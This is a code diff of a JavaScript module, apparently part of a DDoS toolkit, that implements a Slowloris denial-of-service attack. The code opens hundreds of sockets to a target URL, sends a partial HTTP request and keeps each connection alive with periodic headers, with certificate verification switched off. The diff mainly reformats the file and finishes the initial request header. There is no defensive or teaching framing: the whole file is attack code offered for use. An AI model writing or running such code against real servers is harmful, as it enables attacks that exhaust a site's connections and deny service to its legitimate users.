@@ -1,98 +1,98 @@
 // main/ddos/slowloris.js
-import { WebSocket } from 'ws'; // Import WebSocket
+import { WebSocket } from 'ws';
 
 function slowloris(target, numSockets) {
-  if (!target) {
-    console.error("Target URL is required.");
-    return;
-  }
-
-  try {
-    const parsedTarget = new URL(target);
-    const hostname = parsedTarget.hostname;
-    const port = parsedTarget.port || (parsedTarget.protocol === 'https:' ? 443 : 80);
-    const isSecure = parsedTarget.protocol === 'https:';
-    const path = parsedTarget.pathname || "/"; // Add path
-
-    if (!numSockets || numSockets <= 0) {
-      numSockets = 200;
+    if (!target) {
+        console.error("Target URL is required.");
+        return;
     }
 
-    console.log(`Slowloris attack on ${hostname}:${port} using ${numSockets} sockets.`);
+    try {
+        const parsedTarget = new URL(target);
+        const hostname = parsedTarget.hostname;
+        const port = parsedTarget.port || (parsedTarget.protocol === 'https:' ? 443 : 80);
+        const isSecure = parsedTarget.protocol === 'https:';
+        const path = parsedTarget.pathname || "/";
 
-    for (let i = 0; i < numSockets; i++) {
-      createSocket(hostname, port, i, isSecure, path); // Pass path
-    }
-
-    function createSocket(hostname, port, index, isSecure, path) { // Receive path
-      let socket;
-      try {
-        const protocol = isSecure ? 'wss://' : 'ws://';
-        socket = new WebSocket(`${protocol}${hostname}:${port}${path}`, {
-            origin: `${protocol}${hostname}`, // Setting origin
-            rejectUnauthorized: false // Disable SSL certificate verification (use with caution!)
-        });
-
-        socket.on('open', () => {
-          console.log(`Socket ${index + 1} opened.`);
-          sendInitialHeader(socket, hostname, path); // Send initial header with path
-          setInterval(() => {
-            sendKeepAliveHeader(socket); // Send keep-alive header
-          }, 15000);
-        });
-
-        socket.on('close', () => {
-          console.log(`Socket ${index + 1} closed.`);
-        });
-
-        socket.on('error', (error) => {
-          console.error(`Socket ${index + 1} error: ${error.message}`);
-          cleanupSocket(socket, index);
-        });
-      } catch (socketError) {
-        console.error(`Error creating socket ${index + 1}:`, socketError.message);
-      }
-    }
-
-    function sendInitialHeader(socket, hostname, path) {
-      const initialHeader = `GET ${path} HTTP/1.1\r\nHost: ${hostname}\r\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36\r\n`;
-      try {
-        socket.send(initialHeader);
-      } catch (error) {
-        console.error("Error sending initial header:", error.message);
-        cleanupSocket(socket);
-      }
-    }
-
-    function sendKeepAliveHeader(socket) {
-      const keepAliveHeader = "X-Custom-Header: keep-alive\r\n";
-      try {
-        socket.send(keepAliveHeader);
-      } catch (error) {
-        console.error("Error sending keep-alive header:", error.message);
-        cleanupSocket(socket);
-      }
-    }
-
-    function cleanupSocket(socket, index) {
-        try {
-            if (socket && (socket.readyState === WebSocket.OPEN || socket.readyState === WebSocket.CONNECTING)) {
-                socket.close();
-            }
-        } catch (closeError) {
-            if (index !== undefined) {
-                console.error(`Error closing socket ${index + 1}:`, closeError.message);
-            } else {
-                console.error("Error closing socket:", closeError.message);
-            }
-
+        if (!numSockets || numSockets <= 0) {
+            numSockets = 200;
         }
+
+        console.log(`Slowloris attack on ${hostname}:${port} using ${numSockets} sockets.`);
+
+        for (let i = 0; i < numSockets; i++) {
+            createSocket(hostname, port, i, isSecure, path);
+        }
+
+        function createSocket(hostname, port, index, isSecure, path) {
+            let socket;
+            try {
+                const protocol = isSecure ? 'wss://' : 'ws://';
+                socket = new WebSocket(`${protocol}${hostname}:${port}${path}`, {
+                    origin: `${protocol}${hostname}`,
+                    rejectUnauthorized: false
+                });
+
+                socket.on('open', () => {
+                    console.log(`Socket ${index + 1} opened.`);
+                    sendInitialHeader(socket, hostname, path);
+                    setInterval(() => {
+                        sendKeepAliveHeader(socket);
+                    }, 15000);
+                });
+
+                socket.on('close', () => {
+                    console.log(`Socket ${index + 1} closed.`);
+                });
+
+                socket.on('error', (error) => {
+                    console.error(`Socket ${index + 1} error: ${error.message}`);
+                    cleanupSocket(socket, index);
+                });
+            } catch (socketError) {
+                console.error(`Error creating socket ${index + 1}:`, socketError.message);
+            }
+        }
+
+        function sendInitialHeader(socket, hostname, path) {
+            const initialHeader = `GET ${path} HTTP/1.1\r\nHost: ${hostname}\r\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36\r\nConnection: keep-alive\r\n\r\n`;
+            try {
+                socket.send(initialHeader);
+            } catch (error) {
+                console.error("Error sending initial header:", error.message);
+                cleanupSocket(socket);
+            }
+        }
+
+        function sendKeepAliveHeader(socket) {
+            const keepAliveHeader = "X-Custom-Header: keep-alive\r\n";
+            try {
+                socket.send(keepAliveHeader);
+            } catch (error) {
+                console.error("Error sending keep-alive header:", error.message);
+                cleanupSocket(socket);
+            }
+        }
+
+        function cleanupSocket(socket, index) {
+            try {
+                if (socket && (socket.readyState === WebSocket.OPEN || socket.readyState === WebSocket.CONNECTING)) {
+                    socket.close();
+                }
+            } catch (closeError) {
+                if (index !== undefined) {
+                    console.error(`Error closing socket ${index + 1}:`, closeError.message);
+                } else {
+                    console.error("Error closing socket:", closeError.message);
+                }
+
+            }
+        }
+
+
+    } catch (error) {
+        console.error("Error during Slowloris setup:", error.message);
     }
-
-
-  } catch (error) {
-    console.error("Error during Slowloris setup:", error.message);
-  }
 }
 
 export { slowloris };
